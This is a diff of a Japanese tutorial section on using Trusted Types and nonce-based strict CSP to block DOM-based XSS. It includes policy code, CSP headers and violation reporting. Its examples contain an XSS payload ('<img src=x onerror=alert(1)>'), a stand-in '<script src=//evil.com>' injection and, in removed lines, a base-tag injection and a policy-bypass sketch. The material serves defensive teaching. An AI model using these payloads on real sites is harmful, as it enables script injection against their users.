@@ -2,434 +2,498 @@
 
 ## Trusted Types / strict CSP
 
-DOMベースXSSの最大の問題は、「文字列」という信頼できない値がそのまま `innerHTML` や `eval` のような**sink**（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、`document.write`、`Function`、`script.src` など）に流れ込んでしまう構造そのものにある。どれだけ入力検証やサニタイズのルールを整備しても、コードベースのどこか一箇所でも「未検証の文字列をsinkに渡す」コードが混入すれば、そこがXSSになる。**Trusted Types** は、この問題を「言語仕様・ブラウザAPIのレベル」で構造的に解決しようとするW3Cの仕様であり、Content Security Policy(CSP)の `require-trusted-types-for` ディレクティブと組み合わせることで、DOM XSSを機構的に不可能にする防御である。本節ではTrusted Typesの仕組みと、それを支える"strict CSP"（strict-dynamicベースの堅牢なCSP設計）を体系的に学ぶ。
+これまでの章では、`innerHTML` への未検証な文字列代入や `eval` 系APIの誤用といった **DOM-based XSS**、そしてそれを防ぐはずの **CSP（Content Security Policy）** が現実には97%近くバイパス可能である事情（「CSP Is Dead」論文、第4章参照）を見てきました。CSPの `script-src`／`object-src` によるホワイトリストは「どのスクリプトを実行してよいか」をURLやハッシュで宣言する仕組みですが、これはあくまで**スクリプトの出どころ**を制限するものであり、「アプリのコード自身が信頼できない文字列をDOM XSSシンクに流し込む」というバグそのものは塞ぎません。本節で扱う **Trusted Types** は、この「コードの出どころ」問題ではなく「**シンクに渡る値の型**」問題に踏み込んで、DOM-based XSSをブラウザレベルで構造的に潰そうとする、比較的新しいWebプラットフォームのセキュリティ機構です。
 
-### 1. Trusted Typesとは何か、なぜ必要か
+### Trusted Typesが解決しようとしている問題
 
-#### 1.1 従来の防御の限界
-
-サニタイズライブラリ（DOMPurifyなど）を使っていても、次のようなコードは開発者が気づかないままリポジトリに紛れ込みうる。
+Googleの分析によれば、2020年前後の実世界のXSS脆弱性のうち相当割合が「反射型／格納型」ではなく、クライアントサイドJavaScript自身が原因のDOM-based XSSでした。典型的な脆弱パターンは次のようなものです。
 
 ```javascript
-// どこか別のファイルで、レビューを通り抜けたコード
-element.innerHTML = userSuppliedString; // サニタイズ漏れ
+// 攻撃者が制御できる可能性のある値を、
+// そのまま危険なシンクに渡している
+element.innerHTML = location.hash.slice(1);
 ```
 
-この種の「danger sinkへの生文字列代入」は、静的解析やlintでは検出漏れが起きやすく、大規模なコードベース（数百〜数千ファイル）では特に深刻になる。従来のCSPの `script-src` は「どのスクリプトを実行してよいか」を制御するが、**DOM API経由で新たにDOM要素やインラインイベントハンドラを注入する攻撃（DOM XSS）そのものを直接止める仕組みではない**。
+`innerHTML` に代入された文字列は、ブラウザの**HTMLパーサ**によって再解釈され、`<img src=x onerror=alert(1)>` のようなペイロードがそのままDOM要素として構築されてしまいます。これは「文字列としては正しいデータだが、実行コンテキストに置かれた瞬間にコードとして再解釈される」という、XSSに共通する構造的な脆弱性です。
 
-#### 1.2 Trusted Typesの基本アイデア
+Trusted Typesのアイデアは単純です。**「危険なシンク（sink）関数に、生の文字列（string）を渡すこと自体を、ブラウザのレベルで禁止する」**。そのうえで、文字列の代わりに `TrustedHTML` / `TrustedScript` / `TrustedScriptURL` という特別なラッパー型のオブジェクトだけをシンクに渡せるようにし、そのラッパーオブジェクトは開発者が明示的に定義した「**ポリシー（policy）**」関数を通してしか生成できないようにします。つまり、アプリ内で文字列がシンクに到達しうる経路を、あらかじめ定義された少数のポリシー関数に強制的に集約させるわけです。
 
-Trusted Typesは、ブラウザの危険なDOM API（sink）の引数として「生の文字列(string)」を受け付けなくし、代わりに**専用のオブジェクト型**（`TrustedHTML`、`TrustedScript`、`TrustedScriptURL`）のみを受け付けるように強制する。これらのオブジェクトは、開発者が明示的に定義した**ポリシー(Policy)**関数を通してしか生成できない。
+> 出典: web.dev — Trusted Types — https://web.dev/articles/trusted-types
+
+### 危険なシンク関数の一覧
+
+Trusted Typesが監視対象とするDOM XSSシンクは、大きく次のカテゴリに分かれます。
+
+- **HTML注入系**: `Element.innerHTML`、`Element.outerHTML`、`Element.insertAdjacentHTML()`
+- **ドキュメント書き換え系**: `document.write()`、`document.writeln()`
+- **パーサ呼び出し系**: `DOMParser.parseFromString()`
+- **`<script>` 要素の内容設定**: `HTMLScriptElement` のテキストコンテンツやsrc属性
+- **プラグイン実行系**: `<embed src>`、`<object data>`
+- **動的コード実行系**: `eval()`、`setTimeout()`／`setInterval()`（文字列を渡す形式）、`new Function()`
+
+これらはすべて「文字列 → ブラウザ内部でのコード／マークアップとしての再解釈」という同じ危険パターンを持つため、Trusted Typesはこれらの引数の型シグネチャを、単なる `string` から `TrustedHTML` や `TrustedScript` などに置き換えます。ブラウザは、これらのシンクに素の文字列が渡されると、Trusted Types強制モードでは **`TypeError` を投げて実行を止めます**。
+
+### CSPディレクティブによる有効化
+
+Trusted Typesは新しいCSPディレクティブとして提供されます。導入は通常2段階で行います。
+
+**第1段階: `Report-Only` モードで違反を可視化する**
+
+```
+Content-Security-Policy-Report-Only: require-trusted-types-for 'script';
+  report-uri //my-csp-endpoint.example
+```
+
+このヘッダはページの動作をブロックせず、「もし enforcing モードだったらブロックされていたはずの箇所」をレポートとして送信するだけです。既存の大規模アプリでは、どこにどれだけ危険なシンク呼び出しが残っているか事前に把握できないことが多いため、まずreport-onlyで全違反を洗い出すのが定石です。
+
+**第2段階: 違反箇所を修正したうえで `enforcing` モードに切り替える**
+
+```
+Content-Security-Policy: require-trusted-types-for 'script';
+  report-uri //my-csp-endpoint.example
+```
+
+`require-trusted-types-for 'script'` が指定されると、対象ページ内のすべての危険シンクは、生の文字列ではなくTrusted Type値しか受け付けなくなります。さらに `trusted-types` ディレクティブを組み合わせることで、「そのページ上でどの名前のポリシーの作成を許可するか」を宣言できます（後述）。
+
+`require-trusted-types-for` は**サイト全体ではなく個々のドキュメント（HTMLレスポンス）単位**で効きます。したがって、機能を段階的にロールアウトしたいアプリケーションは、ページ単位でこのヘッダを有効化していくことができます。
+
+### なぜ仕組みとして有効なのか——ポリシーへの集約
+
+Trusted Typesが強力なのは、「シンクに到達する経路を1か所に集約させる」設計にあります。ポリシーはTrusted Typeオブジェクトのファクトリであり、次のように作成します。
 
 ```javascript
-// ポリシーを作成する（アプリ起動時に一度だけ）
-const policy = trustedTypes.createPolicy('my-policy', {
-  createHTML: (input) => DOMPurify.sanitize(input),
-});
-
-// ポリシー経由でTrustedHTMLオブジェクトを生成
-const safeHTML = policy.createHTML(userSuppliedString);
-
-// sinkにはTrustedHTML型オブジェクトしか渡せない
-element.innerHTML = safeHTML; // OK
-element.innerHTML = userSuppliedString; // TypeErrorで例外、実行時に検出される
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  const escapeHTMLPolicy = trustedTypes.createPolicy('myEscapePolicy', {
+    createHTML: string => string.replace(/</g, '&lt;')
+  });
+}
 ```
 
-`element.innerHTML = userSuppliedString` のように生文字列を直接渡そうとすると、ブラウザが `TypeError` を投げて代入自体を拒否する。これは**「実行時に強制されるコンパイルエラーのようなもの」**であり、サニタイズ漏れのコードがあっても、本番環境やCI上のテストで例外として顕在化する。つまりTrusted Typesは「バグを未然に防ぐ」というより「バグを検出可能にする（サイレントな脆弱性を作らせない）」ための仕組みだと理解するのが正確である。
+`createPolicy()` の第一引数はポリシー名、第二引数はルールオブジェクトです。ルールオブジェクトに定義できるメンバーは `createHTML`／`createScript`／`createScriptURL` の3つで、それぞれ対応するTrusted Type（`TrustedHTML`／`TrustedScript`／`TrustedScriptURL`）を生成する関数です。重要なのは、**これらの関数自体は普通の文字列を返してよい**という点です。ブラウザは、ポリシー経由で返された文字列を自動的に対応するラッパー型でラップして返します。つまりセキュリティ上の意味は「関数の戻り値が安全であること」ではなく「**その文字列がこのポリシー関数を通過したという証跡があること**」にあります。
 
-> ⚠️ **未取得の資料**: 「web.dev: Prevent DOM-based cross-site scripting vulnerabilities with Trusted Types」は自動取得できませんでした（理由: 環境のegressプロキシによりweb.devドメインへのアクセスがブロックされたため）。以下のURLからユーザーご自身で直接ご覧ください: https://web.dev/articles/trusted-types
->
-> （以下は未取得資料の補足として一般知識およびWeb検索で得た断片情報に基づく解説です）
+```javascript
+const escaped = escapeHTMLPolicy.createHTML('<img src=x onerror=alert(1)>');
+console.log(escaped instanceof TrustedHTML);  // true
+el.innerHTML = escaped;  // 実際にDOMに入るのは '&lt;img src=x onerror=alert(1)>'
+```
 
-上記記事の要旨（Web検索結果からも裏付けられる内容）として、Trusted Types APIは「入力を、実行される可能性のあるAPIに渡す前に、開発者が指定した変換関数を必ず通過させる」ことを保証する仕組みであり、`trustedTypes.createPolicy()` によって作られたポリシーだけが `TrustedHTML` / `TrustedScript` / `TrustedScriptURL` を生成できる。有効なTrusted Typeオブジェクトは必ずいずれかのポリシーに由来するため、**アプリ全体のDOM XSS攻撃対象領域(attack surface)を「ポリシー定義部分」だけに縮小できる**という点が最大の利点である。裏を返せば、レビューやセキュリティ監査の労力も、全コードベースからポリシー定義箇所のみに絞り込める。
+ここでの `escaped` は生の文字列ではなく `TrustedHTML` インスタンスなので、`el.innerHTML = escaped` はTrusted Types強制下でも許可されます。逆に `el.innerHTML = someRawString` のようにポリシーを経由しない文字列を直接渡すコードは、強制モードで即座に `TypeError` になります。
 
-#### 1.3 対象となるsink（危険なDOM API）
+この仕組みが効くのは、**「ポリシー内のロジックが壊れていない限り」** という前提があるからです。言い換えると、Trusted Typesはアプリ全体に散らばっていた「文字列→シンク」の危険な経路を、開発者が明示的に作った少数の `createHTML`/`createScript`/`createScriptURL` 実装に強制的に集約させます。セキュリティレビューやコードオーディットは、アプリ全体を洗うのではなく、**このポリシー関数群だけを重点的に見ればよい**ことになります。web.dev の記事はこれを「enforcement後はDOM XSSの攻撃対象領域がポリシーコード内に限定される」と表現しています。
 
-Trusted Typesが介入する代表的なsinkは以下の通りである。
+### `default` ポリシーとサニタイザ統合
 
-| カテゴリ | 対象sink | 要求される型 |
+すべての `innerHTML` 代入箇所を手作業でポリシー呼び出しに書き換えるのは、大規模な既存コードベースでは現実的でないことがあります。そのための例外的な仕組みが **`default` という予約名のポリシー** です。名前が `default` のポリシーを一つ定義しておくと、ポリシーを経由せずに素の文字列がシンクに渡された場合、ブラウザはまずこの `default` ポリシーを暗黙に適用してからシンクに渡します。
+
+```javascript
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  trustedTypes.createPolicy('default', {
+    createHTML: (string, sink) =>
+      DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true })
+  });
+}
+```
+
+ここで使われている **DOMPurify**（第4章で扱ったHTMLサニタイズライブラリ）は `RETURN_TRUSTED_TYPE: true` オプションに対応しており、サニタイズ結果を生文字列ではなく `TrustedHTML` として返せます。これにより、「既存コードは書き換えずに、シンクに到達するすべての文字列を自動的にサニタイズにかける」という後方互換的な導入経路が成立します。
+
+ただし、web.dev の記事は明確に注意を添えています。**default policyはあくまで移行期の便法であり、恒久的な設計としては個々の呼び出し箇所を専用ポリシーにリファクタリングするほうが望ましい**、という趣旨です。理由は、default policyがアプリ内のすべての未分類の文字列を一手に引き受けてしまうため、「本来は文字列を通すべきでない完全に信頼できないシンク呼び出し」までもがサニタイズさえ通ればブロックされずに素通りしてしまう、粒度の粗さにあります。さらに、サニタイズロジック自体にバグがあれば（第4章のmXSSやDOMPurifyのミューテーションXSSの議論を参照）、Trusted Typesを導入していてもDOM-based XSSは残存しうる、という限界も明記されています。
+
+### 違反レポートの取得方法
+
+Trusted Types違反は、CSP違反と同じ `securitypolicyviolation` イベント、またはより汎用的な `ReportingObserver` API で捕捉できます。
+
+```javascript
+const observer = new ReportingObserver((reports, observer) => {
+  for (const report of reports) {
+    if (report.type !== 'csp-violation' ||
+        report.body.effectiveDirective !== 'require-trusted-types-for') {
+      continue;
+    }
+    const violation = report.body;
+    console.log('Trusted Types Violation:', violation);
+  }
+}, { buffered: true });
+observer.observe();
+```
+
+`buffered: true` を指定すると、オブザーバー登録より前に発生していた違反もバッファから取得できます。`report.body.effectiveDirective` が `'require-trusted-types-for'` であるものだけをフィルタすることで、通常のCSP違反（`script-src` 違反など）と区別してTrusted Types固有の違反だけを収集できます。本番導入の実務では、これをサーバーサイドの `report-uri`／`report-to` エンドポイントで集約し、report-onlyフェーズでの「未対応シンク一覧」の洗い出しに使います。
+
+> 出典: web.dev — Trusted Types — https://web.dev/articles/trusted-types
+
+### ブラウザ対応状況（2026年時点）
+
+Trusted Typesは長らくChromium系ブラウザだけの機能でしたが、対応状況は近年大きく前進しています。
+
+| ブラウザ | 対応バージョン | 対応時期 |
 |---|---|---|
-| HTML注入 | `Element.innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `document.writeln`, `DOMParser.parseFromString` (一部) | `TrustedHTML` |
-| スクリプト実行 | `Function()` コンストラクタ, `eval()`, `setTimeout(string)`, `setInterval(string)` | `TrustedScript` |
-| スクリプトURL | `HTMLScriptElement.src`, `Worker()`, `SharedWorker()`, `<iframe>` の一部属性 | `TrustedScriptURL` |
+| Chrome / Edge | 83以降 | 2020年5月 |
+| Safari | 26以降 | 2025年9月 |
+| Firefox | 対応版以降 | 2026年2月 |
 
-これらは全て、歴史的にDOM XSSの主要な原因となってきたAPI群である。Trusted Typesが有効化された環境では、これらのsinkに生文字列を渡すと例外が発生する（`require-trusted-types-for 'script'` が有効な場合）。
+Firefoxが2026年2月に対応したことで、Trusted Typesは主要4ブラウザすべてで動作する **Baseline**（Web機能の相互運用性を示すステータス）に到達しました。未対応ブラウザ向けには公式のポリフィル（`w3c/trusted-types` リポジトリで提供）が用意されており、`trustedTypes` オブジェクトが存在しない環境でもポリシー生成コードを分岐なく書けるようにできます。
 
-### 2. CSPによる強制: `require-trusted-types-for` と `trusted-types`
+```javascript
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  // Trusted Types対応ブラウザのみ実行
+}
+```
 
-Trusted Types APIそのものは「ポリシーを定義する仕組み」を提供するだけであり、**それを使うかどうかは開発者の任意**である。この「任意性」を強制に変えるのがCSPの2つのディレクティブである。
+この `window.trustedTypes && trustedTypes.createPolicy` という feature-detection パターンは、web.devの例でも一貫して使われており、未対応ブラウザではこのブロックがまるごとスキップされて通常のDOM操作にフォールバックする、後方互換な書き方になっています。
+
+### `trusted-types` ディレクティブによるポリシー名の制限
+
+`require-trusted-types-for 'script'` だけでは「どのコードがどんな名前のポリシーを作れるか」までは制限されません。攻撃者がインジェクションによって独自の `default` という名前のポリシーを新たに登録できてしまえば、正規のポリシーを上書き（あるいは先取り）して攻撃者の任意のcreateHTML実装を仕込む「**ポリシー注入**」が理論上可能になります。これを防ぐのが `trusted-types` ディレクティブです。
 
 ```
 Content-Security-Policy:
   require-trusted-types-for 'script';
-  trusted-types my-policy dompurify-policy;
+  trusted-types myEscapePolicy default;
 ```
 
-- **`require-trusted-types-for 'script'`**: これを指定すると、ブラウザは危険なsink（前節の表）が生文字列を受け取ることを一律で拒否するようになる。これが「強制」の本体である。
-- **`trusted-types <許可ポリシー名のリスト>`**: どのポリシー名を `createPolicy()` で作成してよいかをホワイトリスト化するディレクティブ。これにより、攻撃者が仮に任意コード実行の糸口（例えば `<script>` タグの挿入以外の経路）を得たとしても、勝手に独自の「何でも許すポリシー」（`createHTML: (s) => s` のような無検証ポリシー）を作成して防御を無力化することを防げる。名前が指定されていないポリシーの `createPolicy()` 呼び出しは例外を投げて失敗する。
-- **`trusted-types 'allow-duplicates'`**: 同名ポリシーの複数回作成を許可する特殊キーワード。開発中やホットリロード環境では便利だが、本番では攻撃者に同名ポリシーの上書き（後述するpolicy overrideの脆弱性クラス）を許す可能性があるため、通常は付けない。
+このように許可するポリシー名を明示的に列挙しておくと、リストにない名前で `createPolicy()` を呼んでもブラウザは例外を投げて拒否します。さらに `trusted-types` ディレクティブに `'allow-duplicates'` を指定しない限り、同名のポリシーを二重登録することもデフォルトで禁止されます。これにより、「攻撃者が任意のJS実行を1回だけ得たとしても、既存のポリシー名を乗っ取ることはできない」という追加の防御層が成立します。
 
-> Trusted TypesのCSPディレクティブが**評価される仕組み**は、通常の `script-src` などのソース許可評価（URLやハッシュ・nonceとの文字列比較）とは異なり、**JavaScript実行時にDOM API呼び出しをフックし、渡された値の内部型タグ（ブランド）を検査する**という点に注意したい。CSPパーサーが静的にHTMLを解析するのではなく、ブラウザのDOM実装内部でsink呼び出しのたびに動的にチェックが入る。これはXSS対策の中でも「実行時強制型（runtime enforcement）」に分類される防御であり、静的なホワイトリスト評価しか行わない従来のCSPディレクティブより一段深いレイヤーで動作する。
+### Lighthouseの監査項目「Trusted Types」
 
-#### 2.1 デフォルトポリシー(default policy)
+Chrome DevToolsに統合された監査ツール **Lighthouse** には、Best Practices カテゴリの一項目として "Mitigate DOM-based XSS with Trusted Types"（DOM-based XSSをTrusted Typesで緩和する）という監査が存在します。この監査は、レスポンスのCSPヘッダを検査し、`require-trusted-types-for` ディレクティブが設定されているかどうかを機械的にチェックします。
 
-サードパーティライブラリなど、Trusted Typesに対応していないコードが `element.innerHTML = str` のような呼び出しを行う場合に備え、名前を `'default'` としたポリシーを1つだけ定義できる。
+監査に合格するための最小要件は、次のヘッダをページのCSPに含めることです。
 
-```javascript
-trustedTypes.createPolicy('default', {
-  createHTML: (input) => {
-    // 全ての生文字列innerHTML代入がここを通過する
-    return DOMPurify.sanitize(input);
-  },
-});
+```
+Content-Security-Policy: require-trusted-types-for 'script';
 ```
 
-`default` ポリシーが存在すると、Trusted Types未対応コードからの生文字列代入は例外を出さず、自動的にこのポリシーを通過してから実行される。移行期（レガシーコードとの共存期間）に有用だが、**全てのHTML注入がこの1つのサニタイズ関数に依存することになるため、そのサニタイズ関数自体にバグがあれば防御全体が崩れる**という一点集中リスクがある点に注意。
+Chrome開発者ドキュメントの説明では、Trusted Typesは「危険なインジェクションポイント（`.innerHTML` など）で未検証の文字列が使われることをブロックする、Webプラットフォームのセキュリティ機能」と位置づけられています。監査自体はヘッダの**有無**を機械的に見るだけであり、ポリシー内部のサニタイズロジックの妥当性までは検証しません。したがって、この監査に合格していること自体は「Trusted Typesが有効化されている」ことの証明にはなっても、「default policyの実装が安全である」ことの証明には**なりません**——ここは監査結果を過信しないうえで押さえておくべき注意点です。
 
-### 3. 攻撃者視点: Trusted Typesの回避手法
+> 出典: Chrome for Developers — Trusted Types（Lighthouse Best Practices） — https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types-xss
 
-Trusted Typesは強力だが、「導入されていれば絶対に安全」というわけではない。実務・バグバウンティで観測される回避パターンを整理する。
+### strict CSPとの関係——両者は補完関係にある
 
-#### 3.1 ポリシー名の推測・再利用によるバイパス
+第4章で見た「strict CSP」（`'strict-dynamic'` とnonce/hashを組み合わせたCSP）は、「**どのスクリプトの実行を許可するか**」という出所ベースの制御でした。一方Trusted Typesは、「**アプリ自身のコードが、信頼できない文字列を危険なシンクに渡すこと自体**」を防ぐ、実行時の型制約です。両者が対象とする攻撃面は重なりません。
 
-アプリが `trusted-types` ディレクティブで複数のポリシー名を許可しており、かつそのうちの1つが「入力をそのまま返す」ような緩いポリシー（デバッグ用、サードパーティ製ライブラリ互換用など）だった場合、攻撃者はJavaScript実行のプリミティブ（例えばプロトタイプ汚染や別のDOM XSSギャジェット）を経由して、その緩いポリシーを呼び出すだけでサニタイズをバイパスできる。
+- strict CSPだけを導入した場合: 攻撃者が外部から `<script src=//evil.com>` を注入するタイプの攻撃(第三者スクリプトの持ち込み)は防げますが、アプリ自身のコードが `el.innerHTML = userInput` のようにDOM-based XSSを埋め込んでいれば、そのコードは「正規のインラインスクリプト」として実行されてしまうため無力です。
+- Trusted Typesだけを導入した場合: DOM-based XSSのシンク経路は塞げますが、サーバーサイドの反射型XSSのように、そもそも攻撃者の `<script>` タグがマークアップとしてページに書き出されてしまうケースまでは防げません（それを防ぐのはCSPの `script-src` 側の役割です）。
 
-```javascript
-// アプリがデバッグ用に緩いポリシーを許可していた場合
-const p = trustedTypes.getExposedPolicy ? trustedTypes.getExposedPolicy('legacy-noop') : null;
-// あるいは既存ポリシーオブジェクトへの参照を何らかの経路で取得し、
-// policy.createHTML('<img src=x onerror=alert(1)>') を呼び出す
-```
-
-これが動く理由は、**Trusted Types自体は「どのポリシーが安全な実装か」を検証しない**ためである。ポリシー名をホワイトリストに載せる `trusted-types` ディレクティブは「誰が新規にポリシーを作成できるか」を制限するものであり、既に作られたポリシー実装のロジックの安全性までは保証しない。したがって、緩い実装のポリシーが1つでも存在すれば、それを呼び出せる経路がある限り防御は崩れる。
-
-#### 3.2 `default`ポリシーの未定義によるサイレント許可の誤解
-
-`require-trusted-types-for 'script'` が有効でも `default` ポリシーが定義されていない場合、Trusted Types未対応のサードパーティスクリプトが `innerHTML` に生文字列を代入しようとすると**例外が発生してその代入は失敗する**（サイレントに許可されるわけではない）。しかし、開発者が「動くから安全」と誤解し、エラーを握りつぶす `try/catch` でラップしてしまうと、機能は壊れたまま気づかれず、結果として`default`ポリシーを急いで追加する際に検証が甘くなりがちである。この運用上の落とし穴は実務でよく見られる。
-
-#### 3.3 DOM Clobbering・プロトタイプ汚染との組み合わせ
-
-Trusted Typesは「sinkに渡る値の型」を検査するが、**ポリシー関数自身のロジックにDOM Clobbering**（HTML要素の `id`/`name` 属性によってグローバル変数やDOMプロパティを意図せず上書きする手法）**やプロトタイプ汚染の影響が及ぶ場合**、ポリシー関数が誤ったサニタイズ結果を返す余地が生まれる。例えばポリシー内部で `Object.prototype` のメソッドや、グローバルに公開された設定オブジェクトのプロパティを参照している場合、事前にプロトタイプ汚染で該当プロパティを書き換えておけば、サニタイズ処理の分岐を狂わせられる可能性がある。Trusted Types自体はこの種の間接攻撃を防がないため、ポリシー実装は外部から汚染されうるグローバル状態に依存しないよう設計する必要がある。
-
-#### 3.4 Trusted Types非対応ブラウザでの防御無効化（フォールバック問題）
-
-Trusted TypesはBaseline化が進んでいるものの、対応が最終的に揃ったのは比較的最近である（Web検索結果によれば、Firefoxが2026年2月に対応を完了し、主要ブラウザ全体でBaselineとなったとされる）。したがって、Trusted Types自体はブラウザの機能検出に基づく段階的強化(progressive enhancement)として設計されており、**未対応の古いブラウザやTrusted Types機能を無効化した環境では、CSPの `require-trusted-types-for` ディレクティブ自体が単に無視され、生文字列のsink代入がそのまま通ってしまう**。これはTrusted Types自体の欠陥ではないが、「CSPヘッダーにTrusted Typesを設定したから安全」という早合点は禁物であり、**Trusted Typesは他の防御（strict CSPのscript-src側、入力バリデーション）と重ねて使うべき多層防御の一部**として理解する必要がある。
-
-### 4. strict CSP（`strict-dynamic` + nonce/hash）との関係
-
-Trusted Typesは「DOM API経由でのHTML/スクリプト注入」を防ぐが、そもそも**攻撃者が任意の `<script>` タグをHTMLレスポンスに直接挿入できるサーバサイドXSS（反射型・格納型）**には無力である。これを防ぐのがCSPの `script-src` 側での**strict CSP**設計であり、両者は補完関係にある。
-
-strict CSPの核心は、URLホワイトリスト方式（`script-src https://cdn.example.com`）を捨て、**nonceまたはhashベースの許可**に切り替える点にある。
+したがって実務上の到達点は、**strict CSPで「未承認スクリプトの実行」を止め、Trusted Typesで「アプリ自身のコードが引き起こすDOM-based XSS」を止める**、という二層防御の組み合わせです。CSPヘッダに両方のディレクティブを同時に指定すること自体は問題なく可能です。
 
 ```
 Content-Security-Policy:
-  script-src 'nonce-r4nd0mBase64Value' 'strict-dynamic';
-  object-src 'none';
-  base-uri 'none';
+  script-src 'nonce-RANDOM123' 'strict-dynamic';
+  object-src 'none'; base-uri 'none';
+  require-trusted-types-for 'script';
+  trusted-types default;
 ```
 
-- **`'nonce-...'`**: サーバがレスポンスごとにランダム生成したnonce値を `<script nonce="r4nd0mBase64Value">` に埋め込む。CSPはこのnonce値が一致するスクリプトタグのみ実行を許可する。攻撃者は各リクエストごとに変わるこの値を事前に予測できないため、たとえHTMLインジェクション（反射型XSSの入口）が起きても、攻撃者が挿入した `<script>` タグにはnonceが付与できず実行されない。
-- **`'strict-dynamic'`**: nonceやhashで許可された「信頼できるスクリプト」が動的に生成・挿入する追加のスクリプト（例: バンドローダーが後続チャンクを `document.createElement('script')` で挿入するようなケース）にも信頼を伝播させるキーワード。これがないと、モダンなバンドラー（webpackのコード分割等）を使うアプリでCSPが機能しなくなる。`strict-dynamic` が指定されている場合、URLベースの許可リスト（`https:` や特定ドメイン）は**無視される**という仕様上の挙動があり、これによりホワイトリスト方式にありがちな「JSONPエンドポイントやオープンリダイレクトを経由したCSPバイパス」というクラスの攻撃を根本的に排除できる。
-- **`object-src 'none'`**: `<object>`/`<embed>` 経由でのFlashなどのプラグインベースのXSS（レガシー環境で問題になった）を塞ぐ。
-- **`base-uri 'none'`**: `<base href="https://attacker.example/">` によるsrc相対パスの乗っ取り（base tag injection）を防ぐ。nonce方式のCSPは「正しいnonceが付いたスクリプトタグ」のみを信頼するが、ページ内の相対パスの基準を書き換えられると、意図しないリソースを読み込ませられる場合があるため、この防御を必ず併用する。
+### 導入フローのまとめ
 
-#### なぜURLホワイトリスト方式は脆弱なのか（原理）
+1. **Report-Onlyで観測**: `require-trusted-types-for 'script'` をreport-onlyヘッダで先行導入し、`report-uri`／`ReportingObserver` で違反箇所を洗い出す。
+2. **危険シンクの棚卸し**: `innerHTML`／`document.write`／`eval` などの呼び出し箇所を特定し、可能な限り安全なAPI（`textContent`、`setAttribute` など）への置き換え、またはDOMPurifyのような検証済みサニタイザを介したポリシー呼び出しに書き換える。
+3. **ポリシーの命名と制限**: `trusted-types` ディレクティブで許可するポリシー名を明示的に宣言し、ポリシー注入・二重登録を防ぐ。
+4. **段階的にenforcingへ移行**: すべての既知の違反が解消されたことを確認したうえで、`Content-Security-Policy-Report-Only` から `Content-Security-Policy` に切り替える。
+5. **strict CSPと併用**: `script-src` 側のホワイトリスト回避（第4章参照）を防ぐため、nonceベースのstrict CSPと組み合わせて多層防御とする。
 
-`script-src https://cdn.example.com https://*.googleapis.com` のようなホワイトリスト方式は、CSPが「文字列としてのオリジンマッチ」しか見ていないことに起因する構造的な弱点を抱える。許可された巨大なCDNやクラウドサービスのドメイン配下に、攻撃者が制御可能なJSONPエンドポイント、オープンリダイレクト、あるいはユーザーアップロード可能なファイル領域（GCS/S3バケット等）が1つでも存在すれば、そこを踏み台にして任意のJavaScriptを「許可されたオリジンから」読み込ませることができる。これは2015年前後からGoogle等の研究で繰り返し指摘されてきた、**ホワイトリスト方式CSPのバイパス手法として広く知られる問題である**。nonceベースのstrict CSPはこの「オリジン単位の粗い許可」ではなく、「サーバが発行した個別のトークン単位の許可」に切り替えることで、この攻撃クラスを構造的に排除する。
-
-> ⚠️ **未取得の資料**: 「Chrome for Developers: Mitigate DOM-based XSS with Trusted Types (Lighthouse)」は自動取得できませんでした（理由: 環境のegressプロキシによりdeveloper.chrome.comドメインへのアクセスがブロックされたため）。以下のURLからユーザーご自身で直接ご覧ください: https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types-xss
->
-> （以下は未取得資料の補足として一般知識およびWeb検索で得た断片情報に基づく解説です）
-
-Web検索結果から確認できた要点として、Lighthouseの「trusted-types-xss」監査項目は、**レスポンスのCSPヘッダーに `require-trusted-types-for` ディレクティブが `script` を値として含む形で設定されているかどうか**を機械的にチェックするものであり、設定されていない場合、あるいはCSPヘッダー自体が存在しない場合に監査failとなる。これはLighthouseの「ベストプラクティス」カテゴリの一項目として、サイト運営者がTrusted Types導入状況を継続的に可視化・追跡できるようにする目的で提供されている。関連する別の監査項目「csp-xss」は、strict CSP（nonce/hashベースかつ `'unsafe-inline'` を含まない設計）が実際に有効かどうかをより広く評価するものであり、両者は「sinkレベルの防御(Trusted Types)」と「スクリプト注入経路レベルの防御(strict CSP)」という異なるレイヤーを補完的にチェックしていると理解してよい。
-
-### 5. 導入戦略と実務上の注意点
-
-1. **段階的導入(Report-Onlyモード)**: `require-trusted-types-for` にはReport-Onlyモードが存在する。
-
-   ```
-   Content-Security-Policy-Report-Only:
-     require-trusted-types-for 'script';
-     report-uri /csp-violation-report
-   ```
-
-   これにより、実際にsink呼び出しをブロックせず「どこで違反が発生するか」だけをレポートさせ、既存コードの改修範囲を洗い出してから本番強制(enforce)に移行できる。
-
-2. **ライブラリ対応状況の確認**: DOMPurifyは公式にTrusted Types出力オプション(`RETURN_TRUSTED_TYPE: true`)を持つなど対応が進んでいるが、対応していないサードパーティスクリプトが多いアプリでは`default`ポリシーへの依存度が高くなり、前述のリスクを抱える。
-
-3. **フレームワーク側のサポート**: Angularは早くからTrusted Types対応を組み込んでおり、Reactも `dangerouslySetInnerHTML` 相当の箇所にポリシーを適用する運用が推奨される。新規プロジェクトではフレームワークのデフォルト設定でTrusted Types対応が有効になっているかを確認するのが効率的である。
-
-4. **CSPとTrusted Typesは"サーバ側インジェクション対策"の代替にはならない**: 繰り返しになるが、これらはあくまで「クライアントサイドでの実行系統をどう絞り込むか」という防御であり、テンプレートエンジンでのエスケープ処理やサーバサイドの出力エンコーディングを省略してよい理由にはならない。多層防御の一段として位置づけることが重要である。
-
-### まとめ
-
-- Trusted Typesは、危険なDOM sinkに生文字列を渡すことをブラウザレベルで禁止し、明示的なポリシー関数を通過した型付きオブジェクトのみを受理させることで、DOM XSSの攻撃対象領域を「ポリシー定義箇所」に限定する。
-- CSPの `require-trusted-types-for 'script'` がこの強制を有効化し、`trusted-types <名前リスト>` がポリシー作成自体をホワイトリスト制御する。
-- 防御バイパスは「緩いポリシーの悪用」「ポリシー内部ロジックへのプロトタイプ汚染・DOM Clobberingの影響」「未対応ブラウザでのフォールバック無視」という経路で起こりうる。導入していれば絶対安全、という誤解を避ける必要がある。
